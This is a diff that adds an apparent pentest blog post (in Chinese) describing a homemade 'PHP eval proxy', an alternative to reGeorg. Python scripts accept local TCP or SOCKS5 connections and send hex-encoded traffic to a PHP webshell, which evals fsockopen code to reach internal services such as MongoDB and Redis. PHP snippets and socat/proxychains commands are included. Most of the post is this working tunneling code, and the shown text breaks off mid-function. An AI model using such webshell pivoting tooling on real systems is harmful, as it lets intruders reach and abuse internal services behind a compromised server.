@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>PHP Eval Proxy</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Study The World </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/php-eval-proxy.html" rel="bookmark"
+           title="Permalink to PHP Eval Proxy">PHP Eval Proxy</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2019-10-23T00:00:00+02:00">
+                <a href='#'>10/23/2019 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>背景: linux，php环境下的reGeorg不可用。
+目标: 分析reGeorg的原理尝试改一下
+结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
+<div class="highlight"><pre><span></span><span class="n">Protocols</span> <span class="n">that</span> <span class="k">are</span> <span class="n">suitable</span> <span class="k">to</span> <span class="n">smuggle</span>
+  <span class="n">HTTP</span> <span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
+    <span class="n">Elastic</span><span class="p">,</span> <span class="n">CouchDB</span><span class="p">,</span> <span class="n">Mongodb</span><span class="p">,</span> <span class="n">Docker</span>
+
+  <span class="nb">Text</span><span class="o">-</span><span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
+    <span class="n">FTP</span><span class="p">,</span> <span class="n">SMTP</span><span class="p">,</span> <span class="n">Redis</span><span class="p">,</span> <span class="n">Memcached</span>
+</pre></div>
+
+
+<h3>尝试1</h3>
+<p>这个脚本是个残的:</p>
+<div class="highlight"><pre><span></span><span class="c1">#coding: utf-8</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+<span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="s2">&quot;Accept-Encoding&quot;</span><span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
+<span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Firefox/1.0 (Ubuntu package 1.0.2)&quot;</span><span class="p">,</span>
+<span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
+<span class="s2">&quot;Connection&quot;</span><span class="p">:</span> <span class="s2">&quot;close&quot;</span>
+<span class="p">}</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/eval.php&quot;</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span><span class="mi">8889</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">sock</span><span class="p">,</span> <span class="n">addr_info</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s1">&#39;Connect by &#39;</span><span class="p">,</span> <span class="n">addr_info</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">102400</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;pass=</span><span class="si">%24r</span><span class="s1">es</span><span class="si">%20%</span><span class="s1">3D</span><span class="si">%20f</span><span class="s1">sockopen(%22127.0.0.1</span><span class="si">%22%</span><span class="s1">2C27017)%3B%0A</span><span class="si">%24r</span><span class="s1">aw</span><span class="si">%20%</span><span class="s1">3D</span><span class="si">%20he</span><span class="s1">x2bin(%22&#39;</span> <span class="o">+</span> <span class="n">hex2bin</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;%22)%3B%0Astream_set_timeout(</span><span class="si">%24r</span><span class="s2">es%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(</span><span class="si">%24r</span><span class="s2">es%2C</span><span class="si">%24r</span><span class="s2">aw)%3B%0A</span><span class="si">%24i</span><span class="s2">nfo</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%20s</span><span class="s2">tream_get_meta_data(</span><span class="si">%24r</span><span class="s2">es)%3B%0Aecho</span><span class="si">%20%</span><span class="s2">24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(</span><span class="si">%24o%20%</span><span class="s2">3Dfgets(</span><span class="si">%24r</span><span class="s2">es%2C5))%7B%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20if(</span><span class="si">%24o%20%</span><span class="s2">3D%3D%3D</span><span class="si">%20f</span><span class="s2">alse)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A</span><span class="si">%24r</span><span class="s2">eadBuff%20.%3D</span><span class="si">%20%</span><span class="s2">24o%3B%0A%7D%0Aecho</span><span class="si">%20%</span><span class="s2">24readBuff%3B%0Afclose(</span><span class="si">%24r</span><span class="s2">es)%3B&quot;</span>
+    <span class="k">print</span> <span class="n">payload</span>
+    <span class="n">data2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">},</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+    <span class="k">print</span> <span class="n">data2</span>
+    <span class="k">print</span> <span class="s2">&quot;sending data&quot;</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span>
+</pre></div>
+
+
+<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
+<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
+<p><code>python mongo_proxy  //监听8889
+ socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 //流量肉眼可以看
+ mongo --port 8888  //连接8888</code></p>
+<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
+<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
+<div class="highlight"><pre><span></span><span class="k">Connect</span>: 连接之后生成一个<span class="nv">cookie</span>
+
+<span class="nv">Forward</span>: 把要请求的数据包放在<span class="nv">cookie</span>里面的<span class="nv">writebuf</span>
+
+<span class="nv">Read</span>: <span class="nv">Regeorg</span>的脚本读取<span class="nv">writbuf</span>的数据包之后请求接口服务，比如<span class="nv">curl</span>访问内网端口。然后把结果写入到<span class="nv">cookie</span>里面的<span class="nv">readbuf</span>，读取<span class="nv">readbuf</span>的内容
+
+<span class="k">Disconnect</span>: 把<span class="nv">cookie</span>里面的<span class="nv">run</span>标志变为<span class="nv">false</span>，<span class="nv">cookie</span>就不再使用了。
+</pre></div>
+
+
+<p>所以当Regeorg不能使用的时候，比如第一步的connect无法生成。
+上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。</p>
+<p>有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。</p>
+<div class="highlight"><pre><span></span>失败:
+
+<span class="o">&lt;</span>?<span class="nv">php</span>
+$<span class="nv">ip</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">ip</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+$<span class="nv">port</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">port</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="mh">$c</span><span class="nv">om</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">command</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+$<span class="nv">payload</span> <span class="o">=</span> <span class="mh">$c</span><span class="nv">om</span>.<span class="s1">&#39;</span><span class="s">\r</span><span class="se">\n</span><span class="s1">&#39;</span><span class="c1">;</span>
+$<span class="nv">res</span> <span class="o">=</span> <span class="nv">fsockopen</span><span class="ss">(</span>$<span class="nv">ip</span>,<span class="ss">(</span><span class="nv">int</span><span class="ss">)</span>$<span class="nv">port</span>,<span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
+<span class="o">//</span>$<span class="nv">res</span> <span class="o">=</span> <span class="nv">stream_socket_client</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">tcp://127.0.0.1:6379</span><span class="s2">&quot;</span>, <span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">stream_set_timeout</span><span class="ss">(</span><span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">stream_set_blocking</span><span class="ss">(</span><span class="nv">false</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">res</span>,$<span class="nv">raw</span><span class="ss">)</span><span class="c1">;</span>
+<span class="k">while</span> <span class="ss">(</span>$<span class="nv">o</span><span class="o">=</span><span class="nv">fgets</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">5</span><span class="ss">))</span>{
+$<span class="nv">readbuf</span> .<span class="o">=</span> $<span class="nv">o</span><span class="c1">;</span>
+}
+<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">readbuf</span><span class="ss">)</span><span class="c1">;</span>
+
+<span class="nv">fclose</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>成功:
+
+<span class="o">&lt;</span>?<span class="nv">php</span>
+$<span class="nv">res</span> <span class="o">=</span> <span class="nv">fsockopen</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">127.0.0.1</span><span class="s2">&quot;</span>,<span class="mi">6379</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">raw</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">info\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="nv">stream_set_timeout</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">stream_set_blocking</span><span class="ss">(</span><span class="nv">false</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">res</span>,$<span class="nv">raw</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">info</span> <span class="o">=</span> <span class="nv">stream_get_meta_data</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">echo</span> $<span class="nv">info</span>[<span class="s1">&#39;</span><span class="s">timed_out</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="k">while</span> <span class="ss">(</span>$<span class="nv">o</span> <span class="o">=</span><span class="nv">fgets</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">5</span><span class="ss">))</span>{
+        <span class="k">if</span><span class="ss">(</span>$<span class="nv">o</span> <span class="o">===</span> <span class="nv">false</span><span class="ss">)</span>{<span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">false lala</span><span class="s1">&#39;</span><span class="c1">;}</span>
+$<span class="nv">readBuff</span> .<span class="o">=</span> $<span class="nv">o</span><span class="c1">;</span>
+}
+<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">readBuff</span><span class="ss">)</span><span class="c1">;</span>
+</pre></div>
+
+
+<p>所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。</p>
+<p>既然是eval了，那么就是跟xss一个原理: 你有了一个"编辑器"。</p>
+<p>所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。</p>
+<h3>尝试2</h3>
+<div class="highlight"><pre><span></span><span class="c1"># coding: utf-8</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">VER</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x05</span><span class="s2">&quot;</span>
+<span class="n">METHOD</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<span class="n">SUCCESS</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<span class="n">SOCKFAIL</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span>
+<span class="n">NETWORKFAIL</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span>
+<span class="n">HOSTFAIL</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x04</span><span class="s2">&quot;</span>
+<span class="n">REFUSED</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x05</span><span class="s2">&quot;</span>
+<span class="n">TTLEXPIRED</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x06</span><span class="s2">&quot;</span>
+<span class="n">UNSUPPORTCMD</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x07</span><span class="s2">&quot;</span>
+<span class="n">ADDRTYPEUNSPPORT</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x08</span><span class="s2">&quot;</span>
+<span class="n">UNASSIGNED</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x09</span><span class="s2">&quot;</span>
+
+
+
+<span class="k">def</span> <span class="nf">parseSocks5</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
+
+    <span class="n">nmethods</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="c1"># print nmethods,methods</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">VER</span> <span class="o">+</span> <span class="n">METHOD</span><span class="p">)</span>
+    <span class="n">ver</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="c1"># print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4</span>
+
+    <span class="k">if</span> <span class="n">ver</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># this is a hack for proxychains</span>
+        <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">rsv</span><span class="p">,</span> <span class="n">atyp</span> <span class="o">=</span> <span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">cmd</span><span class="p">,</span> <span class="n">rsv</span><span class="p">,</span> <span class="n">atyp</span> <span class="o">=</span> <span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">targetPort</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">if</span> <span class="n">atyp</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># IPv4</span>
+                <span class="c1"># Reading 6 bytes for the IP and Port</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+        <span class="n">targetPort</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span> <span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">atyp</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># Hostname</span>
+        <span class="n">targetLen</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>  <span class="c1"># hostname length (1 byte)</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">targetLen</span><span class="p">)</span>
+        <span class="n">targetPort</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">unichr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">atyp</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x04</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># IPv6</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">targetPort</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">tmp_addr</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">):</span>
+            <span class="n">tmp_addr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">unichr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">])</span> <span class="o">*</span> <span class="mi">256</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])))</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmp_addr</span><span class="p">)</span>
+    <span class="n">targetPort</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">targetPort</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">*</span> <span class="mi">256</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">targetPort</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="c1"># print targetPort</span>
+    <span class="c1"># print target</span>
+
+    <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># BIND</span>
+        <span class="k">raise</span> <span class="n">SocksCmdNotImplemented</span><span class="p">(</span><span class="s2">&quot;Socks5 - BIND not implemented&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># UDP</span>
+        <span class="k">raise</span> <span class="n">SocksCmdNotImplemented</span><span class="p">(</span><span class="s2">&quot;Socks5 - UDP not implemented&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># CONNECT</span>
+        <span class="n">serverIp</span> <span class="o">=</span> <span class="n">target</span>
+        <span class="n">serverIp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">serverIp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)])</span>
+
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">VER</span> <span class="o">+</span> <span class="n">SUCCESS</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">serverIp</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">targetPort</span> <span class="o">/</span> <span class="mi">256</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">targetPort</span> <span class="o">%</span> <span class="mi">256</span><span class="p">))</span>
+    <span class="c1"># print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))</span>
+    <span class="k">return</span> <span class="n">target</span><span class="p">,</span><span class="n">targetPort</span>
+
+
+<span class="k">def</span> <span class="nf">sendPayload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s2">&quot;[Prepare Payload]&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20480</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;Closing Proxy&quot;</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;&lt;&lt; Recving Data From Client&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">=</span> <span class="s2">&quot;$res = fsockopen(&#39;</span><span class="si">%s</span><span class="s2">&#39;,</span><span class="si">%s</span><span class="s2">);&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">targetPort</span><span class="p">)</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;$raw = hex2bin(&#39;&quot;</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;&#39;);&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;stream_set_timeout($res,1);&quot;</span>
+        <span class="c1"># tmp_payload += &quot;stream_set_blocking(true);&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;fwrite($res,$raw);&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;while ($o =fgets($res,100)){if($o === false){echo &#39;Connect Failed&#39;;}&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;$readBuff .= $o;}&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;echo $readBuff;&quot;</span>
+        <span class="n">tmp_payload</span> <span class="o">+=</span> <span class="s2">&quot;fclose($res);&quot;</span>
+        <span class="c1"># print tmp_payload</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">tmp_payload</span><span class="p">)</span>
+        <span class="c1"># print &quot;The payload is: %s&quot; %payload</span>
+        <span class="n">shell</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">exp</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">},</span>
+                                <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">content</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s2">&quot;&gt;&gt; Sending Data to Client&quot;</span>
+        <span class="n">flag2</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">while</span> <span class="n">flag2</span><span class="p">:</span>
+            <span class="n">sendPayload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">flag2</span><span class="p">)</span>
+        <span class="c1"># else:</span>
